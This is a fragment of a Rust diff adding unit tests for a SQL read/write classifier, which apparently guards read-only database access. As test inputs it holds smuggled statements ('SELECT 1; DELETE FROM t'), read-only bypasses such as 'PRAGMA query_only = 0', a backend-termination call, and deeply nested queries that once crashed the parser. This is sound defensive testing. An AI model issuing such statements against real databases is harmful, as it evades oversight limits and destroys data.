+                "WITH a AS (SELECT 1) REPLACE INTO t SELECT * FROM a",
+                "REPLACE",
+                Some("t"),
+            ),
+            (
+                "WITH a AS (SELECT 1 AS x) SELECT * INTO archive FROM a",
+                "SELECT INTO",
+                Some("archive"),
+            ),
+            (
+                "WITH x AS (SELECT 1) SELECT * INTO stolen FROM x",
+                "SELECT INTO",
+                Some("stolen"),
+            ),
+            (
+                "with x as (select 1) select * into temp stolen from x",
+                "SELECT INTO",
+                Some("stolen"),
+            ),
+        ] {
+            let c = one(sql);
+            assert_eq!(c.kind, StatementKind::Write, "{sql}");
+            assert_eq!(c.verb, verb, "{sql}");
+            assert_eq!(c.target.as_deref(), target, "{sql}");
+        }
+        // `replace(…)` is a function, not a write.
+        assert_eq!(
+            kind("WITH a AS (SELECT replace(name, 'a', 'b') FROM t) SELECT * FROM a"),
+            StatementKind::Read
+        );
+    }
+
+    #[test]
+    fn pragmas_with_a_value_set_it() {
+        for sql in [
+            "PRAGMA user_version(3)",
+            "PRAGMA main.journal_mode(DELETE)",
+            "PRAGMA foreign_keys(0)",
+            "PRAGMA writable_schema = 1",
+            "PRAGMA optimize",
+            "PRAGMA incremental_vacuum",
+        ] {
+            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
+        }
+        for sql in [
+            "PRAGMA table_info(wallets)",
+            "PRAGMA main.index_list('wallets')",
+            "PRAGMA foreign_key_check(wallets)",
+            "PRAGMA integrity_check(10)",
+            "PRAGMA journal_mode",
+            "PRAGMA foreign_keys",
+        ] {
+            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
+        }
+        for sql in ["PRAGMA \"query_only\" = 0", "PRAGMA 'query_only'(0)"] {
+            assert!(one(sql).unlocks_writes, "{sql}");
+        }
+    }
+
+    #[test]
+    fn quoted_signal_functions_are_writes() {
+        for sql in [
+            "SELECT \"pg_terminate_backend\"(42)",
+            "SELECT pg_catalog.\"pg_cancel_backend\"(42)",
+        ] {
+            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
+        }
+        assert!(one("SELECT \"pg_terminate_backend\"(42)").destructive);
+    }
+
+    #[test]
+    fn explain_never_overflows_or_panics() {
+        // Each EXPLAIN was a recursive call: ~5000 of them aborted.
+        let deep = format!("{}DELETE FROM t", "EXPLAIN ANALYZE ".repeat(50_000));
+        assert_eq!(one(&deep).kind, StatementKind::Write);
+        let deep = format!("{}SELECT 1", "EXPLAIN ".repeat(50_000));
+        assert_eq!(kind(&deep), StatementKind::Read);
+        let deep = format!(
+            "{}DELETE FROM t RETURNING *{}",
+            "COPY (".repeat(50_000),
+            ") TO STDOUT".repeat(50_000)
+        );
+        assert_eq!(kind(&deep), StatementKind::Write);
+        let deep = format!(
+            "{}SELECT 1{}",
+            "COPY (".repeat(50_000),
+            ") TO STDOUT".repeat(50_000)
+        );
+        assert_eq!(kind(&deep), StatementKind::Read);
+        let deep = format!("{}SELECT 1", "EXPLAIN (ANALYZE) (".repeat(50_000));
+        assert_eq!(kind(&deep), StatementKind::Read);
+        for sql in ["EXPLAIN (", "EXPLAIN (ANALYZE", "explain (analyze, buffers"] {
+            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
+        }
+        assert_eq!(
+            kind("EXPLAIN (ANALYZE) DELETE FROM t"),
+            StatementKind::Write
+        );
+    }
+
+    #[test]
+    fn plain_reads_call_no_function() {
+        for sql in [
+            "SELECT * FROM t WHERE id IN (1, 2) AND EXISTS (SELECT 1 FROM u)",
+            "WITH x AS (SELECT a FROM t) SELECT * FROM x JOIN (SELECT 1) y ON (true)",
+            "VALUES (1), (2)",
+            "TABLE t",
+            "SHOW search_path",
+            "EXPLAIN (FORMAT JSON) SELECT * FROM t",
+            "SELECT 'f(x)' AS s",
+        ] {
+            assert!(plain_read(sql), "{sql}");
+        }
+        for sql in [
+            "SELECT write_fn()",
+            "SELECT count(*) FROM t",
+            "SELECT nextval('s')",
+            "SELECT \"f\"(1)",
+            "SELECT * FROM s.f(1)",
+            "EXPLAIN (ANALYZE) INSERT INTO t VALUES (1)",
+            "EXPLAIN ANALYZE SELECT f()",
+            "SELECT 1; DELETE FROM t",
+            "BEGIN",
+            "",
+        ] {
+            assert!(!plain_read(sql), "{sql}");
+        }
     }
 }
